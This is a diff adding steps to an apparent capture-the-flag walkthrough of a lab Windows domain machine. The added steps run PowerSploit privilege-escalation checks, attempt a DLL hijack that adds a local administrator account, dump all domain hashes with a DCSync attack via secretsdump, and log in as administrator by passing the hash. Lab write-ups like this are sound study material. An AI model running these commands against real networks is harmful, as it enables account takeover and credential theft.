@@ -56,7 +56,56 @@ megacorp\svc_bes
 > cat user.txt
 b05fb166688a8603d970c6d033f637f1
 ```
+copy all the `git/PowerSploit/Privesc` into windows machine powershell foulder    
 
+```
+> echo $Env:PSModulePath
+C:\Users\svc_bes\Documents\WindowsPowerShell\Modules
+> upload to C:\Users\svc_bes\Documents\WindowsPowerShell\Modules\Privesc
+> Import-Module Privesc
+> Invoke-AllChecks
+
+...blablabla...
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+
+ModifiablePath    : C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps
+IdentityReference : MEGACORP\svc_bes
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+...blablabla...
+
+
+```
+
+lets do it!
+
+```
+> Write-HijackDll -DllPath 'C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+> net user john1432 Password123! /add && timeout /t 5 && net localgroup Administrators john1432 /add
+```
+FAIL
+
+from tutorial:
+In order to leverage the `GetChangesAll` permission, we can use Impacket's `secretsdump.py` to perform a DCSync attack and dump the NTLM hashes of all domain users.    
+
+`python ~/git/impacket/examples/secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30`    
+
+Works like a magic. All users with all the hahses are here.    
+
+And we even dont need to crack these hashes, as we can login directly using them.    
+
+`python ~/git/impacket/examples/psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18`    
+
+And this is the end of this machine     
+
+```
+>type root.txt
+ee613b2d048303e5fd4ac6647d944645
+```
 
 
 
